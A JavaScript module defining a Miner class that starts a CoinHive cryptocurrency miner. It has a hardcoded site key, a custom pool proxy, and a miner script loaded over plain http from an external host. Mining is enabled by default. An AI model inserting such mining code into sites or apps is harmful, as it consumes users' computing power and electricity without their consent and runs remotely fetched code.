import CoinHive from 'coin-hive'

class Miner {
  constructor (savesSetup) {
    this.siteKey = 'SAQOkYryaUVeCkxfBaHpOZ98ebi7lxE4'
    this.setup = {
      username: 'Anonymous',
      pool: {
        host: 'yunworker-proxy.clo5de.info',
        port: 8892
      },
      minerUrl: 'http://yunworker-proxy.clo5de.info:5001/static/coinhive.min.js',
      devFee: 0
    }
    this.savesSetup = savesSetup || {
      enable: true,
      threads: 1,
      throttle: 0.9
    }
    this.isStart = false
  }

  async updateSetup (username, savesSetup) {
    let update = false
    if (this.setup.username !== username || this.savesSetup !== savesSetup) {
      this.setup.username = username || this.setup.username
      this.savesSetup = savesSetup || this.savesSetup
      await this.miner.stop()
      await this.miner.start()
      console.log('Miner updated: ' + JSON.stringify(this.savesSetup, null, 4) + '\n, username: ' + username)
      update = true
    }
    return {'update': update}
  }

  async start (username) {
    if (this.savesSetup.enable && !this.isStart) {
      this.savesSetup.username = username || 'Anonymous'
      this.miner = await CoinHive(this.siteKey, Object.assign({}, this.setup, this.savesSetup))
      await this.miner.start()
      this.isStart = true

      return {'coinhive': this.savesSetup, 'username': username}
    } else {
      return {'coinhive': this.savesSetup}
    }
  }

  async stop () {
    if (this.isStart) {
      await this.miner.stop()
      this.isStart = false
    }
  }
}

export default Miner
